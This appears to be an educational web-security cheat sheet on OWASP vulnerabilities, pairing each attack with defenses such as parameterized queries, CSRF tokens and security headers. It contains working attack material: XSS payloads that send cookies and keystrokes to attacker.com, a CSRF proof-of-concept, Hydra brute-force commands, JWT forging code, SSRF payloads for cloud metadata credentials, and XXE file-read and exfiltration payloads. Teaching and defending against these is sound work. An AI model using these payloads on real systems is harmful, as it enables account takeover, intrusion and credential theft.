A01
BROKEN ACCESS CONTROL
Found in 94% of applications — the most common vulnerability
Critical

Access control enforces that users cannot act outside their intended permissions. Failures allow attackers to access unauthorized data, modify other users' accounts, perform privileged actions, or view all records.

Common Patterns:

  • IDOR — Insecure Direct Object Reference (change ID in URL)
  • Missing function-level access — /admin accessible without auth
  • Horizontal escalation — access other users' data
  • Vertical escalation — user accessing admin functions
  • Path traversal — ../../../../etc/passwd
// IDOR ExamplesGET /api/user/1337/profile ← change to another user's ID GET /api/orders/42 ← see other user's order GET /download?file=../../../etc/passwd POST /api/user/456/promote ← promote another user
access control testing
python
import requests

# ── IDOR Test: try accessing other users' resources ──
session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_COOKIE')

# Your user ID is 1000 — try others
for uid in range(999, 1010):
    r = session.get(f"https://target.com/api/user/{uid}/profile")
    if r.status_code == 200 and "email" in r.text:
        print(f"IDOR! User {uid}: {r.json().get('email')}")

# ── Privilege Escalation Test ─────────────────────
# Log in as normal user, try admin endpoints
admin_endpoints = ['/admin', '/admin/users', '/api/admin/settings']
for ep in admin_endpoints:
    r = session.get(f"https://target.com{ep}")
    print(f"{ep}: {r.status_code}")  # 200 = vulnerability!
Defense
Deny access by default. Implement server-side access control — never trust client-supplied IDs alone. Use indirect references (map user→resources server-side). Log and alert on access control failures.
A02
CRYPTOGRAPHIC FAILURES
Data exposed in transit or at rest — weak/missing encryption
Critical▾

What to look for:

  • HTTP instead of HTTPS
  • Weak TLS versions (TLS 1.0/1.1, SSL)
  • Passwords stored as MD5/SHA-1
  • Sensitive data in URL parameters
  • Hardcoded secrets in source code / git history
  • Weak random number generation
  • Missing Secure flag on cookies

A04
INSECURE DESIGN
Missing or ineffective control design — new in 2021
High▾

Design flaws that cannot be fixed by perfect implementation. Examples: no rate limiting on login → brute force possible. No email verification → account enumeration. Business logic that allows negative quantities → free goods.

Example
A cinema allows booking up to 15 seats. Attacker scripts booking/cancelling all seats → no one else can book → competitor sabotage. Not a bug — it's a design flaw.

SQL Injection

The most devastating web vulnerability — allows reading, modifying, and deleting database contents, and often leads to complete server compromise.

HOW SQL INJECTION WORKS Vulnerable application builds query like this: query = "SELECT * FROM users WHERE username='" + user_input + "'" Normal input: username = "alice" → SELECT * FROM users WHERE username='alice' ← safe Malicious input: username = "' OR '1'='1" → SELECT * FROM users WHERE username='' OR '1'='1' ↑ always true — returns ALL users, bypasses login! Even worse: username = "admin'--" → SELECT * FROM users WHERE username='admin'--' ↑ -- comments out rest → login as admin, no password check!
error-basedboolean-based blindtime-based blindunion-basedout-of-band

defense — parameterized queries
python
# ✗ VULNERABLE — string concatenation
query = f"SELECT * FROM users WHERE id = {user_id}"

# ✓ SAFE — parameterized query
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))

# ✓ SAFE — SQLAlchemy ORM
user = User.query.filter_by(id=user_id).first()

OWASP A03
XSS — Cross-Site Scripting

Injecting malicious scripts into web pages viewed by other users. Used to steal cookies, hijack sessions, redirect users, and perform actions on their behalf.

Reflected XSS

Payload in the HTTP request is reflected in the response. User must click a crafted link. Not stored — hits one victim at a time.

?search=<script>alert(1)</script>

Stored XSS

Payload persisted in database (comments, usernames, profiles). Every user who views the page executes the script. Most dangerous type.

Comment: <script>stealCookie()</script>

DOM-Based XSS

Payload processed entirely by JavaScript in the browser. Never hits the server. Hard to detect with server-side WAFs.

#<img src=x onerror=alert(1)>

// Basic Detection <script>alert(1)</script> <script>alert(document.domain)</script> <img src=x onerror=alert(1)> <svg onload=alert(1)> "><script>alert(1)</script> '><script>alert(1)</script> </tag><script>alert(1)</script> javascript:alert(1) // Cookie Stealing Payload <script> fetch('https://attacker.com/steal?c=' + document.cookie) </script> <img src=x onerror=" new Image().src='https://attacker.com/?c='+encodeURIComponent(document.cookie) "> // Keylogger <script> document.onkeypress=function(e){ fetch('https://attacker.com/log?k='+e.key) } </script> // Filter Bypass Attempts <ScRiPt>alert(1)</ScRiPt> ← case variation <scr<script>ipt>alert(1) ← nested tags <svg/onload=alert(1)> ← no space <a href="javascript:alert(1)">Click</a>
defense — output encoding
python / js
# ✗ VULNERABLE — direct output
return f"<p>Hello {username}</p>"

# ✓ SAFE — HTML encode output (Python/Jinja2)
from markupsafe import escape
return f"<p>Hello {escape(username)}</p>"

# ✓ SAFE — React (JSX auto-escapes)
return <p>Hello {username}</p>  // safe by default
// NEVER: dangerouslySetInnerHTML = {{ __html: userInput }}

# ✓ Content Security Policy header
# Prevents execution of inline scripts
Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-RANDOM123';
  style-src 'self';

# ✓ HttpOnly Cookie flag
# Prevents JavaScript reading the cookie
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict

# Test your CSP at: csp-evaluator.withgoogle.com
Impact Chain
XSS → steal session cookie → replay cookie → account takeover. If session cookie has HttpOnly flag, XSS can still perform actions AS the user (CSRF-like), change their email/password, extract CSRF tokens.

Client-Side Attacks
CSRF & IDOR

Cross-Site Request Forgery forces authenticated users to perform unintended actions. Insecure Direct Object Reference exposes internal object identifiers.

CSRF — Cross-Site Request Forgery

CSRF ATTACK FLOW 1. User logs into bank.com → session cookie set 2. User visits evil.com (attacker's page) 3. evil.com loads hidden form: <form action="https://bank.com/transfer" method="POST"> <input name="to" value="attacker_account"> <input name="amount" value="10000"> </form> <script>document.forms[0].submit()</script> 4. Browser sends POST to bank.com WITH session cookie 5. Bank.com processes transfer — user's money gone!
// CSRF PoC HTML template <html> <body onload="document.forms[0].submit()"> <form method="POST" action="https://target.com/change-email"> <input type="hidden" name="email" value="attacker@evil.com"> </form> </body> </html> // GET-based CSRF (even simpler) <img src="https://bank.com/transfer?to=attacker&amount=1000">
CSRF defense
python
# ✓ CSRF Token (server generates, validates)
# Every form gets a unique, unpredictable token
import secrets
csrf_token = secrets.token_hex(32)
session['csrf_token'] = csrf_token

# In form:
# <input type="hidden" name="csrf_token" value="{{ csrf_token }}">

# On form submit — verify token matches
if request.form['csrf_token'] != session['csrf_token']:
    return "CSRF detected!", 403

# ✓ SameSite Cookie attribute
Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
# Strict: cookie never sent cross-site (breaks some flows)
# Lax:    sent for top-level navigation GETs only

# ✓ Check Origin / Referer header (extra layer)
if request.headers.get('Origin') != 'https://yoursite.com':
    abort(403)

Authentication Attacks

Broken authentication — session fixation, credential stuffing, brute force, password reset flaws, JWT attacks.

brute force with hydra
bash
# HTTP POST form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid"

# SSH brute force
hydra -l root -P rockyou.txt ssh://target.com

# HTTP Basic Auth
hydra -l admin -P rockyou.txt target.com http-get /admin

# Rate limit bypass techniques:
# - X-Forwarded-For: rotate IPs
# - X-Originating-IP: change each request
# - Slow down: add delays between attempts
# - Username enumeration: different errors for
#   valid vs invalid usernames
JWT attacks
python
import jwt, base64, json

token = "eyJhbGci..."
# Decode JWT (no verification)
parts = token.split('.')
header  = json.loads(base64.b64decode(parts[0] + '=='))
payload = json.loads(base64.b64decode(parts[1] + '=='))
print(header)   # {"alg":"HS256","typ":"JWT"}
print(payload)  # {"user":"rudra","role":"user"}

# Attack 1: alg=none (remove signature)
fake_header = base64.b64encode(
    b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
fake_payload = base64.b64encode(
    b'{"user":"admin","role":"admin"}').decode().rstrip('=')
forged = f"{fake_header}.{fake_payload}."

# Attack 2: HS256 weak secret brute force
# hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# Attack 3: RS256 → HS256 confusion
# Sign with server's public key using HS256
# Server verifies HMAC using "public key" as HMAC key

Password Reset Vulnerabilities

  • Predictable tokens — sequential or time-based reset tokens
  • Long expiry — tokens valid for days
  • No single-use — token works multiple times
  • Host header injection — poison reset link with attacker domain
  • Username enumeration — different responses for valid/invalid users
// Host Header Injection → Password Reset Poisoning POST /reset-password HTTP/1.1 Host: attacker.com ← attacker changes this X-Forwarded-Host: evil.com ← or this Body: email=victim@target.com → Server sends reset email with link: https://attacker.com/reset?token=SECRET_TOKEN → Victim clicks link → attacker's server logs token! // Session Fixation 1. Attacker visits login page → gets sessionID=KNOWN 2. Tricks victim into using ?sessionid=KNOWN 3. Victim logs in → their session = KNOWN 4. Attacker uses KNOWN session → account takeover!
Defense Checklist
Use long random tokens (32+ bytes). Single-use — invalidate after use. Short expiry (15-60 min). Rate limit login + reset. Lock account after N failures. MFA. Never leak valid usernames in error messages.

SSRF & XXE

Server-Side Request Forgery forces the server to fetch attacker-controlled URLs — bypassing firewalls. XXE exploits XML parsers to read files and perform SSRF.

SSRF — Server-Side Request Forgery

SSRF ATTACK FLOW Application: POST /fetch-url {"url": "https://api.partner.com/data"} Attacker changes URL to internal service: {"url": "http://169.254.169.254/metadata"} ← AWS metadata {"url": "http://localhost/admin"} {"url": "http://10.0.0.1/internal-api"} Server fetches it → attacker gets internal data!
// SSRF Payloads http://127.0.0.1/ http://localhost/admin http://[::1]/ ← IPv6 loopback http://0.0.0.0/ http://169.254.169.254/ ← AWS IMDS http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://metadata.google.internal/ ← GCP metadata http://100.100.100.200/ ← Alibaba Cloud // SSRF Filter Bypass http://evil.com@127.0.0.1 ← URL confusion http://127.0.0.1#.evil.com ← fragment trick http://127。0。0。1 ← Unicode dots http://0x7f000001/ ← Hex IP = 127.0.0.1 http://2130706433/ ← Decimal IP = 127.0.0.1

XXE — XML External Entity

// Basic XXE — read /etc/passwd <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <root> <data>&xxe;</data> </root> // XXE → SSRF (internal request) <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata"> ]> // Blind XXE — out-of-band data exfiltration <!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?data=%file;'>"> %eval; %exfil; ]> // XXE in JSON? Test switching Content-Type Content-Type: application/xml <?xml ...?>
Defense
Disable XML external entity processing in parsers. Use allowlists for SSRF — only permit specific, expected domains. Validate and sanitize all user-supplied URLs. Don't return server responses to client when fetching URLs.

Security Headers

HTTP response headers that instruct browsers to enforce security policies. Each mitigates a specific class of attack.

HeaderAttack MitigatedRecommended Value
Content-Security-PolicyXSS, data injectiondefault-src 'self'; script-src 'self' 'nonce-{random}'
Strict-Transport-SecurityProtocol downgrade, MITMmax-age=31536000; includeSubDomains; preload
X-Frame-OptionsClickjackingDENY or SAMEORIGIN
X-Content-Type-OptionsMIME sniffingnosniff
Referrer-PolicyURL info leakageno-referrer or strict-origin-when-cross-origin
Permissions-PolicyFeature abuse (camera, mic)geolocation=(), microphone=(), camera=()
Cache-ControlSensitive data cachingno-store (for sensitive pages)
X-Powered-ByTechnology fingerprintingRemove entirely
ServerVersion fingerprintingRemove or obscure
implementing security headers — Flask / Express / Nginx
multi
# ── Flask (Python) ─────────────────────────────────────────
from flask_talisman import Talisman
Talisman(app, content_security_policy={
    'default-src': "'self'",
    'script-src': ["'self'", 'cdn.jsdelivr.net'],
    'style-src': ["'self'", 'fonts.googleapis.com']
})

# ── Express.js (Node) ──────────────────────────────────────
const helmet = require('helmet');
app.use(helmet());    // sets all security headers automatically
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`]
  }
}));

# ── Nginx config ───────────────────────────────────────────
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
server_tokens off;    # hide nginx version
